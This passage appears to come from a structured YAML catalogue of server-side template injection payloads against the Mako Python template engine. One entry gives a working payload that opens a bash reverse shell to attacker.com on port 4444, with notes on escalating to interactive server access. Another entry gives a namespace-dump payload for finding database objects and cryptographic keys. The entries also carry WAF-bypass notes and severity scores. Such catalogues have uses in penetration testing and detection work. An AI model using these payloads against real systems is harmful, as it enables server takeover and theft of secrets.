    last_updated: '2024-01-01'
  - id: ssti-mako-004
    title: Mako reverse shell
    payload_string: ${__import__('os').system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')}
    how_it_works: 'Using os.system() (which returns the exit code, not output) rather than popen(), this payload executes
      a bash reverse shell. The command connects back to the attacker''s listener, providing an interactive shell with the
      web server''s OS user privileges. Unlike popen().read() which waits for the command to complete, os.system() can run
      background processes. This is the escalation from information disclosure to full interactive server access.

      '
    prerequisites:
    - Mako SSTI on Unix/Linux server
    - bash available and outbound TCP to attacker
    waf_bypass_notes: os.system vs os.popen; shell=True enables string command parsing
    severity_context: CVSS 9.8 – Mako SSTI to interactive reverse shell
    cve_refs: []
    tags:
    - ssti
    - mako
    - reverse-shell
    - rce
    - interactive
    - unix
    date_added: '2024-01-01'
    last_updated: '2024-01-01'
  - id: ssti-mako-005
    title: Mako namespace access
    payload_string: ${namespace.module.__dict__}
    how_it_works: 'Mako templates have access to a namespace object that represents the current module''s namespace. Accessing
      namespace.module.__dict__ reveals all imported modules, global variables, and functions in the current Python module.
      This reconnaissance technique identifies available modules that can be used for further exploitation without requiring
      __import__. If database connection objects, authentication modules, or cryptographic keys appear in the namespace, they
      can be accessed directly.

      '
    prerequisites:
    - Mako SSTI
    - namespace object in template context
    waf_bypass_notes: Reconnaissance payload; no dangerous keywords
    severity_context: CVSS 7.5 – Mako namespace dump for exploitation reconnaissance
    cve_refs: []
    tags:
    - ssti
    - mako
    - namespace
    - reconnaissance
    - module-access
    date_added: '2024-01-01'
